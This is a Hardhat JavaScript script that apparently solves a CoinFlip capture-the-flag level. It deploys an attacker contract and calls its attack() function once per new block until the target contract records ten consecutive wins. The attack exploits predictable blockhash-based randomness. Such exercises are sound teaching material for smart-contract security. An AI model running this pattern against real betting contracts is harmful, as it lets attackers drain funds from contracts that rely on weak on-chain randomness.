const { Alchemy } = require("alchemy-sdk");
const hre = require("hardhat");

async function main() {
  const COINFLIP_ADDRESS = "0xB02e98da0a724c88ba98157e5934e2a2c8cCa364"; // write your instance address
  const alchemy = new Alchemy();
  let latestBlockNumber;

  const ContractFactory = await hre.ethers.getContractFactory("AttackCoinFlip");
  const contract = await ContractFactory.deploy(
    await hre.ethers.utils.getAddress(COINFLIP_ADDRESS)
  );

  await contract.deployed();

  const coinFlip = await (
    await hre.ethers.getContractFactory("CoinFlip")
  ).attach(COINFLIP_ADDRESS);

  const timer = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  let wins = (await coinFlip.consecutiveWins()).toString();
  console.log("Initial wins: ", wins);

  (async () => {
    while (wins < 10) {
      const blockNumber = await alchemy.core.getBlockNumber();
      if (!latestBlockNumber) {
        latestBlockNumber = blockNumber;
      }

      if (blockNumber !== latestBlockNumber) {
        latestBlockNumber = blockNumber;
        console.log("====================================");
        console.log("blockNuber: ", blockNumber);
        try {
          await contract.attack();
          console.log("successfully attacked!");
        } catch (err) {
          console.log("err: ", err);
        }
        await timer(2000); // wait for consecutiveWins variable to be updated
        wins = (await coinFlip.consecutiveWins()).toString();
        console.log("wins: ", await wins);
      }
      await timer(2000);
    }
  })();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
